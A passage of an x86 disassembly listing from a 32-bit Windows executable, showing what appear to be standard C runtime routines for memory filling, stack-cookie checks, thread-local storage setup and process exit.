  401eed:	8b f1                	mov    %ecx,%esi
  401eef:	e8 49 f5 ff ff       	call   0x40143d
  401ef4:	8b ce                	mov    %esi,%ecx
  401ef6:	e8 57 f5 ff ff       	call   0x401452
  401efb:	8b f8                	mov    %eax,%edi
  401efd:	85 ff                	test   %edi,%edi
  401eff:	75 23                	jne    0x401f24
  401f01:	8b ce                	mov    %esi,%ecx
  401f03:	e8 e6 f9 ff ff       	call   0x4018ee
  401f08:	8b f8                	mov    %eax,%edi
  401f0a:	85 ff                	test   %edi,%edi
  401f0c:	75 16                	jne    0x401f24
  401f0e:	8b ce                	mov    %esi,%ecx
  401f10:	e8 d5 f7 ff ff       	call   0x4016ea
  401f15:	8b f8                	mov    %eax,%edi
  401f17:	85 ff                	test   %edi,%edi
  401f19:	75 09                	jne    0x401f24
  401f1b:	8b ce                	mov    %esi,%ecx
  401f1d:	e8 81 fc ff ff       	call   0x401ba3
  401f22:	8b f8                	mov    %eax,%edi
  401f24:	83 3d 44 d0 40 00 00 	cmpl   $0x0,0x40d044
  401f2b:	75 22                	jne    0x401f4f
  401f2d:	6a 0a                	push   $0xa
  401f2f:	ff 15 74 90 40 00    	call   *0x409074
  401f35:	8d 86 24 12 00 00    	lea    0x1224(%esi),%eax
  401f3b:	50                   	push   %eax
  401f3c:	ff 15 5c 90 40 00    	call   *0x40905c
  401f42:	81 c6 28 13 00 00    	add    $0x1328,%esi
  401f48:	56                   	push   %esi
  401f49:	ff 15 58 90 40 00    	call   *0x409058
  401f4f:	8b c7                	mov    %edi,%eax
  401f51:	5f                   	pop    %edi
  401f52:	5e                   	pop    %esi
  401f53:	c3                   	ret
  401f54:	83 25 24 d9 40 00 00 	andl   $0x0,0x40d924
  401f5b:	c3                   	ret
  401f5c:	cc                   	int3
  401f5d:	cc                   	int3
  401f5e:	cc                   	int3
  401f5f:	cc                   	int3
  401f60:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401f64:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401f68:	85 d2                	test   %edx,%edx
  401f6a:	74 69                	je     0x401fd5
  401f6c:	33 c0                	xor    %eax,%eax
  401f6e:	8a 44 24 08          	mov    0x8(%esp),%al
  401f72:	84 c0                	test   %al,%al
  401f74:	75 16                	jne    0x401f8c
  401f76:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  401f7c:	72 0e                	jb     0x401f8c
  401f7e:	83 3d 04 d9 40 00 00 	cmpl   $0x0,0x40d904
  401f85:	74 05                	je     0x401f8c
  401f87:	e9 4e 11 00 00       	jmp    0x4030da
  401f8c:	57                   	push   %edi
  401f8d:	8b f9                	mov    %ecx,%edi
  401f8f:	83 fa 04             	cmp    $0x4,%edx
  401f92:	72 31                	jb     0x401fc5
  401f94:	f7 d9                	neg    %ecx
  401f96:	83 e1 03             	and    $0x3,%ecx
  401f99:	74 0c                	je     0x401fa7
  401f9b:	2b d1                	sub    %ecx,%edx
  401f9d:	88 07                	mov    %al,(%edi)
  401f9f:	83 c7 01             	add    $0x1,%edi
  401fa2:	83 e9 01             	sub    $0x1,%ecx
  401fa5:	75 f6                	jne    0x401f9d
  401fa7:	8b c8                	mov    %eax,%ecx
  401fa9:	c1 e0 08             	shl    $0x8,%eax
  401fac:	03 c1                	add    %ecx,%eax
  401fae:	8b c8                	mov    %eax,%ecx
  401fb0:	c1 e0 10             	shl    $0x10,%eax
  401fb3:	03 c1                	add    %ecx,%eax
  401fb5:	8b ca                	mov    %edx,%ecx
  401fb7:	83 e2 03             	and    $0x3,%edx
  401fba:	c1 e9 02             	shr    $0x2,%ecx
  401fbd:	74 06                	je     0x401fc5
  401fbf:	f3 ab                	rep stos %eax,%es:(%edi)
  401fc1:	85 d2                	test   %edx,%edx
  401fc3:	74 0a                	je     0x401fcf
  401fc5:	88 07                	mov    %al,(%edi)
  401fc7:	83 c7 01             	add    $0x1,%edi
  401fca:	83 ea 01             	sub    $0x1,%edx
  401fcd:	75 f6                	jne    0x401fc5
  401fcf:	8b 44 24 08          	mov    0x8(%esp),%eax
  401fd3:	5f                   	pop    %edi
  401fd4:	c3                   	ret
  401fd5:	8b 44 24 04          	mov    0x4(%esp),%eax
  401fd9:	c3                   	ret
  401fda:	3b 0d 20 c0 40 00    	cmp    0x40c020,%ecx
  401fe0:	75 02                	jne    0x401fe4
  401fe2:	f3 c3                	repz ret
  401fe4:	e9 17 f0 ff ff       	jmp    0x401000
  401fe9:	55                   	push   %ebp
  401fea:	8b ec                	mov    %esp,%ebp
  401fec:	51                   	push   %ecx
  401fed:	51                   	push   %ecx
  401fee:	53                   	push   %ebx
  401fef:	56                   	push   %esi
  401ff0:	33 f6                	xor    %esi,%esi
  401ff2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401ff5:	46                   	inc    %esi
  401ff6:	33 db                	xor    %ebx,%ebx
  401ff8:	50                   	push   %eax
  401ff9:	89 75 f8             	mov    %esi,-0x8(%ebp)
  401ffc:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401fff:	e8 81 06 00 00       	call   0x402685
  402004:	83 7d fc 05          	cmpl   $0x5,-0x4(%ebp)
  402008:	59                   	pop    %ecx
  402009:	7e 04                	jle    0x40200f
  40200b:	8b c6                	mov    %esi,%eax
  40200d:	eb 42                	jmp    0x402051
  40200f:	57                   	push   %edi
  402010:	53                   	push   %ebx
  402011:	ff 15 a0 90 40 00    	call   *0x4090a0
  402017:	8b 70 3c             	mov    0x3c(%eax),%esi
  40201a:	03 f0                	add    %eax,%esi
  40201c:	66 39 5e 06          	cmp    %bx,0x6(%esi)
  402020:	0f b7 46 14          	movzwl 0x14(%esi),%eax
  402024:	8d 7c 30 18          	lea    0x18(%eax,%esi,1),%edi
  402028:	76 23                	jbe    0x40204d
  40202a:	57                   	push   %edi
  40202b:	68 68 94 40 00       	push   $0x409468
  402030:	e8 4b 11 00 00       	call   0x403180
  402035:	85 c0                	test   %eax,%eax
  402037:	59                   	pop    %ecx
  402038:	59                   	pop    %ecx
  402039:	74 0e                	je     0x402049
  40203b:	0f b7 46 06          	movzwl 0x6(%esi),%eax
  40203f:	43                   	inc    %ebx
  402040:	83 c7 28             	add    $0x28,%edi
  402043:	3b d8                	cmp    %eax,%ebx
  402045:	72 e3                	jb     0x40202a
  402047:	eb 04                	jmp    0x40204d
  402049:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40204d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402050:	5f                   	pop    %edi
  402051:	5e                   	pop    %esi
  402052:	5b                   	pop    %ebx
  402053:	c9                   	leave
  402054:	c3                   	ret
  402055:	56                   	push   %esi
  402056:	ff 35 34 c0 40 00    	push   0x40c034
  40205c:	8b 35 a4 90 40 00    	mov    0x4090a4,%esi
  402062:	ff d6                	call   *%esi
  402064:	85 c0                	test   %eax,%eax
  402066:	74 21                	je     0x402089
  402068:	a1 30 c0 40 00       	mov    0x40c030,%eax
  40206d:	83 f8 ff             	cmp    $0xffffffff,%eax
  402070:	74 17                	je     0x402089
  402072:	50                   	push   %eax
  402073:	ff 35 34 c0 40 00    	push   0x40c034
  402079:	ff d6                	call   *%esi
  40207b:	ff d0                	call   *%eax
  40207d:	85 c0                	test   %eax,%eax
  40207f:	74 08                	je     0x402089
  402081:	8b 80 f8 01 00 00    	mov    0x1f8(%eax),%eax
  402087:	eb 26                	jmp    0x4020af
  402089:	68 80 94 40 00       	push   $0x409480
  40208e:	ff 15 a0 90 40 00    	call   *0x4090a0
  402094:	8b f0                	mov    %eax,%esi
  402096:	85 f6                	test   %esi,%esi
  402098:	74 23                	je     0x4020bd
  40209a:	e8 4a ff ff ff       	call   0x401fe9
  40209f:	85 c0                	test   %eax,%eax
  4020a1:	74 1a                	je     0x4020bd
  4020a3:	68 70 94 40 00       	push   $0x409470
  4020a8:	56                   	push   %esi
  4020a9:	ff 15 48 90 40 00    	call   *0x409048
  4020af:	85 c0                	test   %eax,%eax
  4020b1:	74 0a                	je     0x4020bd
  4020b3:	ff 74 24 08          	push   0x8(%esp)
  4020b7:	ff d0                	call   *%eax
  4020b9:	89 44 24 08          	mov    %eax,0x8(%esp)
  4020bd:	8b 44 24 08          	mov    0x8(%esp),%eax
  4020c1:	5e                   	pop    %esi
  4020c2:	c3                   	ret
  4020c3:	6a 00                	push   $0x0
  4020c5:	e8 8b ff ff ff       	call   0x402055
  4020ca:	59                   	pop    %ecx
  4020cb:	c3                   	ret
  4020cc:	56                   	push   %esi
  4020cd:	ff 35 34 c0 40 00    	push   0x40c034
  4020d3:	8b 35 a4 90 40 00    	mov    0x4090a4,%esi
  4020d9:	ff d6                	call   *%esi
  4020db:	85 c0                	test   %eax,%eax
  4020dd:	74 21                	je     0x402100
  4020df:	a1 30 c0 40 00       	mov    0x40c030,%eax
  4020e4:	83 f8 ff             	cmp    $0xffffffff,%eax
  4020e7:	74 17                	je     0x402100
  4020e9:	50                   	push   %eax
  4020ea:	ff 35 34 c0 40 00    	push   0x40c034
  4020f0:	ff d6                	call   *%esi
  4020f2:	ff d0                	call   *%eax
  4020f4:	85 c0                	test   %eax,%eax
  4020f6:	74 08                	je     0x402100
  4020f8:	8b 80 fc 01 00 00    	mov    0x1fc(%eax),%eax
  4020fe:	eb 26                	jmp    0x402126
  402100:	68 80 94 40 00       	push   $0x409480
  402105:	ff 15 a0 90 40 00    	call   *0x4090a0
  40210b:	8b f0                	mov    %eax,%esi
  40210d:	85 f6                	test   %esi,%esi
  40210f:	74 23                	je     0x402134
  402111:	e8 d3 fe ff ff       	call   0x401fe9
  402116:	85 c0                	test   %eax,%eax
  402118:	74 1a                	je     0x402134
  40211a:	68 90 94 40 00       	push   $0x409490
  40211f:	56                   	push   %esi
  402120:	ff 15 48 90 40 00    	call   *0x409048
  402126:	85 c0                	test   %eax,%eax
  402128:	74 0a                	je     0x402134
  40212a:	ff 74 24 08          	push   0x8(%esp)
  40212e:	ff d0                	call   *%eax
  402130:	89 44 24 08          	mov    %eax,0x8(%esp)
  402134:	8b 44 24 08          	mov    0x8(%esp),%eax
  402138:	5e                   	pop    %esi
  402139:	c3                   	ret
  40213a:	ff 15 a8 90 40 00    	call   *0x4090a8
  402140:	c2 04 00             	ret    $0x4
  402143:	56                   	push   %esi
  402144:	ff 35 34 c0 40 00    	push   0x40c034
  40214a:	ff 15 a4 90 40 00    	call   *0x4090a4
  402150:	8b f0                	mov    %eax,%esi
  402152:	85 f6                	test   %esi,%esi
  402154:	75 1b                	jne    0x402171
  402156:	ff 35 4c d0 40 00    	push   0x40d04c
  40215c:	e8 6b ff ff ff       	call   0x4020cc
  402161:	59                   	pop    %ecx
  402162:	8b f0                	mov    %eax,%esi
  402164:	56                   	push   %esi
  402165:	ff 35 34 c0 40 00    	push   0x40c034
  40216b:	ff 15 ac 90 40 00    	call   *0x4090ac
  402171:	8b c6                	mov    %esi,%eax
  402173:	5e                   	pop    %esi
  402174:	c3                   	ret
  402175:	a1 30 c0 40 00       	mov    0x40c030,%eax
  40217a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40217d:	74 16                	je     0x402195
  40217f:	50                   	push   %eax
  402180:	ff 35 54 d0 40 00    	push   0x40d054
  402186:	e8 41 ff ff ff       	call   0x4020cc
  40218b:	59                   	pop    %ecx
  40218c:	ff d0                	call   *%eax
  40218e:	83 0d 30 c0 40 00 ff 	orl    $0xffffffff,0x40c030
  402195:	a1 34 c0 40 00       	mov    0x40c034,%eax
  40219a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40219d:	74 0e                	je     0x4021ad
  40219f:	50                   	push   %eax
  4021a0:	ff 15 b0 90 40 00    	call   *0x4090b0
  4021a6:	83 0d 34 c0 40 00 ff 	orl    $0xffffffff,0x40c034
  4021ad:	e9 9f 10 00 00       	jmp    0x403251
  4021b2:	6a 0c                	push   $0xc
  4021b4:	68 80 ad 40 00       	push   $0x40ad80
  4021b9:	e8 96 1d 00 00       	call   0x403f54
  4021be:	68 80 94 40 00       	push   $0x409480
  4021c3:	ff 15 a0 90 40 00    	call   *0x4090a0
  4021c9:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4021cc:	8b 75 08             	mov    0x8(%ebp),%esi
  4021cf:	c7 46 5c 98 c7 40 00 	movl   $0x40c798,0x5c(%esi)
  4021d6:	33 ff                	xor    %edi,%edi
  4021d8:	47                   	inc    %edi
  4021d9:	89 7e 14             	mov    %edi,0x14(%esi)
  4021dc:	85 c0                	test   %eax,%eax
  4021de:	74 2f                	je     0x40220f
  4021e0:	e8 04 fe ff ff       	call   0x401fe9
  4021e5:	85 c0                	test   %eax,%eax
  4021e7:	74 26                	je     0x40220f
  4021e9:	68 70 94 40 00       	push   $0x409470
  4021ee:	ff 75 e4             	push   -0x1c(%ebp)
  4021f1:	8b 1d 48 90 40 00    	mov    0x409048,%ebx
  4021f7:	ff d3                	call   *%ebx
  4021f9:	89 86 f8 01 00 00    	mov    %eax,0x1f8(%esi)
  4021ff:	68 90 94 40 00       	push   $0x409490
  402204:	ff 75 e4             	push   -0x1c(%ebp)
  402207:	ff d3                	call   *%ebx
  402209:	89 86 fc 01 00 00    	mov    %eax,0x1fc(%esi)
  40220f:	89 7e 70             	mov    %edi,0x70(%esi)
  402212:	c6 86 c8 00 00 00 43 	movb   $0x43,0xc8(%esi)
  402219:	c6 86 4b 01 00 00 43 	movb   $0x43,0x14b(%esi)
  402220:	b8 78 c2 40 00       	mov    $0x40c278,%eax
  402225:	89 46 68             	mov    %eax,0x68(%esi)
  402228:	50                   	push   %eax
  402229:	ff 15 b4 90 40 00    	call   *0x4090b4
  40222f:	6a 0c                	push   $0xc
  402231:	e8 48 11 00 00       	call   0x40337e
  402236:	59                   	pop    %ecx
  402237:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40223b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40223e:	89 46 6c             	mov    %eax,0x6c(%esi)
  402241:	85 c0                	test   %eax,%eax
  402243:	75 08                	jne    0x40224d
  402245:	a1 68 c2 40 00       	mov    0x40c268,%eax
  40224a:	89 46 6c             	mov    %eax,0x6c(%esi)
  40224d:	ff 76 6c             	push   0x6c(%esi)
  402250:	e8 9a 12 00 00       	call   0x4034ef
  402255:	59                   	pop    %ecx
  402256:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40225d:	e8 06 00 00 00       	call   0x402268
  402262:	e8 32 1d 00 00       	call   0x403f99
  402267:	c3                   	ret
  402268:	6a 0c                	push   $0xc
  40226a:	e8 37 10 00 00       	call   0x4032a6
  40226f:	59                   	pop    %ecx
  402270:	c3                   	ret
  402271:	56                   	push   %esi
  402272:	57                   	push   %edi
  402273:	ff 15 c0 90 40 00    	call   *0x4090c0
  402279:	ff 35 30 c0 40 00    	push   0x40c030
  40227f:	8b f8                	mov    %eax,%edi
  402281:	e8 bd fe ff ff       	call   0x402143
  402286:	ff d0                	call   *%eax
  402288:	8b f0                	mov    %eax,%esi
  40228a:	85 f6                	test   %esi,%esi
  40228c:	75 4e                	jne    0x4022dc
  40228e:	68 14 02 00 00       	push   $0x214
  402293:	6a 01                	push   $0x1
  402295:	e8 ec 1e 00 00       	call   0x404186
  40229a:	8b f0                	mov    %eax,%esi
  40229c:	85 f6                	test   %esi,%esi
  40229e:	59                   	pop    %ecx
  40229f:	59                   	pop    %ecx
  4022a0:	74 3a                	je     0x4022dc
  4022a2:	56                   	push   %esi
  4022a3:	ff 35 30 c0 40 00    	push   0x40c030
  4022a9:	ff 35 50 d0 40 00    	push   0x40d050
  4022af:	e8 18 fe ff ff       	call   0x4020cc
  4022b4:	59                   	pop    %ecx
  4022b5:	ff d0                	call   *%eax
  4022b7:	85 c0                	test   %eax,%eax
  4022b9:	74 18                	je     0x4022d3
  4022bb:	6a 00                	push   $0x0
  4022bd:	56                   	push   %esi
  4022be:	e8 ef fe ff ff       	call   0x4021b2
  4022c3:	59                   	pop    %ecx
  4022c4:	59                   	pop    %ecx
  4022c5:	ff 15 bc 90 40 00    	call   *0x4090bc
  4022cb:	83 4e 04 ff          	orl    $0xffffffff,0x4(%esi)
  4022cf:	89 06                	mov    %eax,(%esi)
  4022d1:	eb 09                	jmp    0x4022dc
  4022d3:	56                   	push   %esi
  4022d4:	e8 b6 09 00 00       	call   0x402c8f
  4022d9:	59                   	pop    %ecx
  4022da:	33 f6                	xor    %esi,%esi
  4022dc:	57                   	push   %edi
  4022dd:	ff 15 b8 90 40 00    	call   *0x4090b8
  4022e3:	5f                   	pop    %edi
  4022e4:	8b c6                	mov    %esi,%eax
  4022e6:	5e                   	pop    %esi
  4022e7:	c3                   	ret
  4022e8:	56                   	push   %esi
  4022e9:	e8 83 ff ff ff       	call   0x402271
  4022ee:	8b f0                	mov    %eax,%esi
  4022f0:	85 f6                	test   %esi,%esi
  4022f2:	75 08                	jne    0x4022fc
  4022f4:	6a 10                	push   $0x10
  4022f6:	e8 aa 02 00 00       	call   0x4025a5
  4022fb:	59                   	pop    %ecx
  4022fc:	8b c6                	mov    %esi,%eax
  4022fe:	5e                   	pop    %esi
  4022ff:	c3                   	ret
  402300:	6a 08                	push   $0x8
  402302:	68 a0 ad 40 00       	push   $0x40ada0
  402307:	e8 48 1c 00 00       	call   0x403f54
  40230c:	8b 75 08             	mov    0x8(%ebp),%esi
  40230f:	85 f6                	test   %esi,%esi
  402311:	0f 84 ea 00 00 00    	je     0x402401
  402317:	8b 46 24             	mov    0x24(%esi),%eax
  40231a:	85 c0                	test   %eax,%eax
  40231c:	74 07                	je     0x402325
  40231e:	50                   	push   %eax
  40231f:	e8 6b 09 00 00       	call   0x402c8f
  402324:	59                   	pop    %ecx
  402325:	8b 46 2c             	mov    0x2c(%esi),%eax
  402328:	85 c0                	test   %eax,%eax
  40232a:	74 07                	je     0x402333
  40232c:	50                   	push   %eax
  40232d:	e8 5d 09 00 00       	call   0x402c8f
  402332:	59                   	pop    %ecx
  402333:	8b 46 34             	mov    0x34(%esi),%eax
  402336:	85 c0                	test   %eax,%eax
  402338:	74 07                	je     0x402341
  40233a:	50                   	push   %eax
  40233b:	e8 4f 09 00 00       	call   0x402c8f
  402340:	59                   	pop    %ecx
  402341:	8b 46 3c             	mov    0x3c(%esi),%eax
  402344:	85 c0                	test   %eax,%eax
  402346:	74 07                	je     0x40234f
  402348:	50                   	push   %eax
  402349:	e8 41 09 00 00       	call   0x402c8f
  40234e:	59                   	pop    %ecx
  40234f:	8b 46 44             	mov    0x44(%esi),%eax
  402352:	85 c0                	test   %eax,%eax
  402354:	74 07                	je     0x40235d
  402356:	50                   	push   %eax
  402357:	e8 33 09 00 00       	call   0x402c8f
  40235c:	59                   	pop    %ecx
  40235d:	8b 46 48             	mov    0x48(%esi),%eax
  402360:	85 c0                	test   %eax,%eax
  402362:	74 07                	je     0x40236b
  402364:	50                   	push   %eax
  402365:	e8 25 09 00 00       	call   0x402c8f
  40236a:	59                   	pop    %ecx
  40236b:	8b 46 5c             	mov    0x5c(%esi),%eax
  40236e:	3d 98 c7 40 00       	cmp    $0x40c798,%eax
  402373:	74 07                	je     0x40237c
  402375:	50                   	push   %eax
  402376:	e8 14 09 00 00       	call   0x402c8f
  40237b:	59                   	pop    %ecx
  40237c:	6a 0d                	push   $0xd
  40237e:	e8 fb 0f 00 00       	call   0x40337e
  402383:	59                   	pop    %ecx
  402384:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402388:	8b 7e 68             	mov    0x68(%esi),%edi
  40238b:	85 ff                	test   %edi,%edi
  40238d:	74 1a                	je     0x4023a9
  40238f:	57                   	push   %edi
  402390:	ff 15 c4 90 40 00    	call   *0x4090c4
  402396:	85 c0                	test   %eax,%eax
  402398:	75 0f                	jne    0x4023a9
  40239a:	81 ff 78 c2 40 00    	cmp    $0x40c278,%edi
  4023a0:	74 07                	je     0x4023a9
  4023a2:	57                   	push   %edi
  4023a3:	e8 e7 08 00 00       	call   0x402c8f
  4023a8:	59                   	pop    %ecx
  4023a9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4023b0:	e8 57 00 00 00       	call   0x40240c
  4023b5:	6a 0c                	push   $0xc
  4023b7:	e8 c2 0f 00 00       	call   0x40337e
  4023bc:	59                   	pop    %ecx
  4023bd:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4023c4:	8b 7e 6c             	mov    0x6c(%esi),%edi
  4023c7:	85 ff                	test   %edi,%edi
  4023c9:	74 23                	je     0x4023ee
  4023cb:	57                   	push   %edi
  4023cc:	e8 a4 11 00 00       	call   0x403575
  4023d1:	59                   	pop    %ecx
  4023d2:	3b 3d 68 c2 40 00    	cmp    0x40c268,%edi
  4023d8:	74 14                	je     0x4023ee
  4023da:	81 ff 90 c1 40 00    	cmp    $0x40c190,%edi
  4023e0:	74 0c                	je     0x4023ee
  4023e2:	83 3f 00             	cmpl   $0x0,(%edi)
  4023e5:	75 07                	jne    0x4023ee
  4023e7:	57                   	push   %edi
  4023e8:	e8 c2 0f 00 00       	call   0x4033af
  4023ed:	59                   	pop    %ecx
  4023ee:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4023f5:	e8 1e 00 00 00       	call   0x402418
  4023fa:	56                   	push   %esi
  4023fb:	e8 8f 08 00 00       	call   0x402c8f
  402400:	59                   	pop    %ecx
  402401:	e8 93 1b 00 00       	call   0x403f99
  402406:	c2 04 00             	ret    $0x4
  402409:	8b 75 08             	mov    0x8(%ebp),%esi
  40240c:	6a 0d                	push   $0xd
  40240e:	e8 93 0e 00 00       	call   0x4032a6
  402413:	59                   	pop    %ecx
  402414:	c3                   	ret
  402415:	8b 75 08             	mov    0x8(%ebp),%esi
  402418:	6a 0c                	push   $0xc
  40241a:	e8 87 0e 00 00       	call   0x4032a6
  40241f:	59                   	pop    %ecx
  402420:	c3                   	ret
  402421:	57                   	push   %edi
  402422:	68 80 94 40 00       	push   $0x409480
  402427:	ff 15 a0 90 40 00    	call   *0x4090a0
  40242d:	8b f8                	mov    %eax,%edi
  40242f:	85 ff                	test   %edi,%edi
  402431:	75 09                	jne    0x40243c
  402433:	e8 3d fd ff ff       	call   0x402175
  402438:	33 c0                	xor    %eax,%eax
  40243a:	5f                   	pop    %edi
  40243b:	c3                   	ret
  40243c:	56                   	push   %esi
  40243d:	8b 35 48 90 40 00    	mov    0x409048,%esi
  402443:	68 c0 94 40 00       	push   $0x4094c0
  402448:	57                   	push   %edi
  402449:	ff d6                	call   *%esi
  40244b:	68 b4 94 40 00       	push   $0x4094b4
  402450:	57                   	push   %edi
  402451:	a3 48 d0 40 00       	mov    %eax,0x40d048
  402456:	ff d6                	call   *%esi
  402458:	68 a8 94 40 00       	push   $0x4094a8
  40245d:	57                   	push   %edi
  40245e:	a3 4c d0 40 00       	mov    %eax,0x40d04c
  402463:	ff d6                	call   *%esi
  402465:	68 a0 94 40 00       	push   $0x4094a0
  40246a:	57                   	push   %edi
  40246b:	a3 50 d0 40 00       	mov    %eax,0x40d050
  402470:	ff d6                	call   *%esi
  402472:	83 3d 48 d0 40 00 00 	cmpl   $0x0,0x40d048
  402479:	8b 35 ac 90 40 00    	mov    0x4090ac,%esi
  40247f:	a3 54 d0 40 00       	mov    %eax,0x40d054
  402484:	74 16                	je     0x40249c
  402486:	83 3d 4c d0 40 00 00 	cmpl   $0x0,0x40d04c
  40248d:	74 0d                	je     0x40249c
  40248f:	83 3d 50 d0 40 00 00 	cmpl   $0x0,0x40d050
  402496:	74 04                	je     0x40249c
  402498:	85 c0                	test   %eax,%eax
  40249a:	75 24                	jne    0x4024c0
  40249c:	a1 a4 90 40 00       	mov    0x4090a4,%eax
  4024a1:	a3 4c d0 40 00       	mov    %eax,0x40d04c
  4024a6:	a1 b0 90 40 00       	mov    0x4090b0,%eax
  4024ab:	c7 05 48 d0 40 00 3a 	movl   $0x40213a,0x40d048
  4024b2:	21 40 00 
  4024b5:	89 35 50 d0 40 00    	mov    %esi,0x40d050
  4024bb:	a3 54 d0 40 00       	mov    %eax,0x40d054
  4024c0:	ff 15 a8 90 40 00    	call   *0x4090a8
  4024c6:	83 f8 ff             	cmp    $0xffffffff,%eax
  4024c9:	a3 34 c0 40 00       	mov    %eax,0x40c034
  4024ce:	0f 84 cc 00 00 00    	je     0x4025a0
  4024d4:	ff 35 4c d0 40 00    	push   0x40d04c
  4024da:	50                   	push   %eax
  4024db:	ff d6                	call   *%esi
  4024dd:	85 c0                	test   %eax,%eax
  4024df:	0f 84 bb 00 00 00    	je     0x4025a0
  4024e5:	e8 8b 03 00 00       	call   0x402875
  4024ea:	ff 35 48 d0 40 00    	push   0x40d048
  4024f0:	e8 60 fb ff ff       	call   0x402055
  4024f5:	ff 35 4c d0 40 00    	push   0x40d04c
  4024fb:	a3 48 d0 40 00       	mov    %eax,0x40d048
  402500:	e8 50 fb ff ff       	call   0x402055
  402505:	ff 35 50 d0 40 00    	push   0x40d050
  40250b:	a3 4c d0 40 00       	mov    %eax,0x40d04c
  402510:	e8 40 fb ff ff       	call   0x402055
  402515:	ff 35 54 d0 40 00    	push   0x40d054
  40251b:	a3 50 d0 40 00       	mov    %eax,0x40d050
  402520:	e8 30 fb ff ff       	call   0x402055
  402525:	83 c4 10             	add    $0x10,%esp
  402528:	a3 54 d0 40 00       	mov    %eax,0x40d054
  40252d:	e8 d6 0c 00 00       	call   0x403208
  402532:	85 c0                	test   %eax,%eax
  402534:	74 65                	je     0x40259b
  402536:	68 00 23 40 00       	push   $0x402300
  40253b:	ff 35 48 d0 40 00    	push   0x40d048
  402541:	e8 86 fb ff ff       	call   0x4020cc
  402546:	59                   	pop    %ecx
  402547:	ff d0                	call   *%eax
  402549:	83 f8 ff             	cmp    $0xffffffff,%eax
  40254c:	a3 30 c0 40 00       	mov    %eax,0x40c030
  402551:	74 48                	je     0x40259b
  402553:	68 14 02 00 00       	push   $0x214
  402558:	6a 01                	push   $0x1
  40255a:	e8 27 1c 00 00       	call   0x404186
  40255f:	8b f0                	mov    %eax,%esi
  402561:	85 f6                	test   %esi,%esi
  402563:	59                   	pop    %ecx
  402564:	59                   	pop    %ecx
  402565:	74 34                	je     0x40259b
  402567:	56                   	push   %esi
  402568:	ff 35 30 c0 40 00    	push   0x40c030
  40256e:	ff 35 50 d0 40 00    	push   0x40d050
  402574:	e8 53 fb ff ff       	call   0x4020cc
  402579:	59                   	pop    %ecx
  40257a:	ff d0                	call   *%eax
  40257c:	85 c0                	test   %eax,%eax
  40257e:	74 1b                	je     0x40259b
  402580:	6a 00                	push   $0x0
  402582:	56                   	push   %esi
  402583:	e8 2a fc ff ff       	call   0x4021b2
  402588:	59                   	pop    %ecx
  402589:	59                   	pop    %ecx
  40258a:	ff 15 bc 90 40 00    	call   *0x4090bc
  402590:	83 4e 04 ff          	orl    $0xffffffff,0x4(%esi)
  402594:	89 06                	mov    %eax,(%esi)
  402596:	33 c0                	xor    %eax,%eax
  402598:	40                   	inc    %eax
  402599:	eb 07                	jmp    0x4025a2
  40259b:	e8 d5 fb ff ff       	call   0x402175
  4025a0:	33 c0                	xor    %eax,%eax
  4025a2:	5e                   	pop    %esi
  4025a3:	5f                   	pop    %edi
  4025a4:	c3                   	ret
  4025a5:	e8 0f 1e 00 00       	call   0x4043b9
  4025aa:	ff 74 24 04          	push   0x4(%esp)
  4025ae:	e8 66 1c 00 00       	call   0x404219
  4025b3:	ff 35 38 c0 40 00    	push   0x40c038
  4025b9:	e8 0e fb ff ff       	call   0x4020cc
  4025be:	68 ff 00 00 00       	push   $0xff
  4025c3:	ff d0                	call   *%eax
  4025c5:	83 c4 0c             	add    $0xc,%esp
  4025c8:	c3                   	ret
  4025c9:	68 dc 94 40 00       	push   $0x4094dc
  4025ce:	ff 15 a0 90 40 00    	call   *0x4090a0
  4025d4:	85 c0                	test   %eax,%eax
  4025d6:	74 16                	je     0x4025ee
  4025d8:	68 cc 94 40 00       	push   $0x4094cc
  4025dd:	50                   	push   %eax
  4025de:	ff 15 48 90 40 00    	call   *0x409048
  4025e4:	85 c0                	test   %eax,%eax
  4025e6:	74 06                	je     0x4025ee
  4025e8:	ff 74 24 04          	push   0x4(%esp)
  4025ec:	ff d0                	call   *%eax
  4025ee:	c3                   	ret
  4025ef:	ff 74 24 04          	push   0x4(%esp)
  4025f3:	e8 d1 ff ff ff       	call   0x4025c9
  4025f8:	59                   	pop    %ecx
  4025f9:	ff 74 24 04          	push   0x4(%esp)
  4025fd:	ff 15 c8 90 40 00    	call   *0x4090c8
  402603:	cc                   	int3
  402604:	6a 08                	push   $0x8
  402606:	e8 73 0d 00 00       	call   0x40337e
  40260b:	59                   	pop    %ecx
  40260c:	c3                   	ret
  40260d:	6a 08                	push   $0x8
  40260f:	e8 92 0c 00 00       	call   0x4032a6
  402614:	59                   	pop    %ecx
  402615:	c3                   	ret
  402616:	56                   	push   %esi
  402617:	8b f0                	mov    %eax,%esi
  402619:	eb 0b                	jmp    0x402626
  40261b:	8b 06                	mov    (%esi),%eax
  40261d:	85 c0                	test   %eax,%eax
  40261f:	74 02                	je     0x402623
  402621:	ff d0                	call   *%eax
  402623:	83 c6 04             	add    $0x4,%esi
  402626:	3b 74 24 08          	cmp    0x8(%esp),%esi
  40262a:	72 ef                	jb     0x40261b
  40262c:	5e                   	pop    %esi
  40262d:	c3                   	ret
  40262e:	56                   	push   %esi
  40262f:	8b 74 24 08          	mov    0x8(%esp),%esi
  402633:	33 c0                	xor    %eax,%eax
  402635:	eb 0f                	jmp    0x402646
  402637:	85 c0                	test   %eax,%eax
  402639:	75 11                	jne    0x40264c
  40263b:	8b 0e                	mov    (%esi),%ecx
  40263d:	85 c9                	test   %ecx,%ecx
  40263f:	74 02                	je     0x402643
  402641:	ff d1                	call   *%ecx
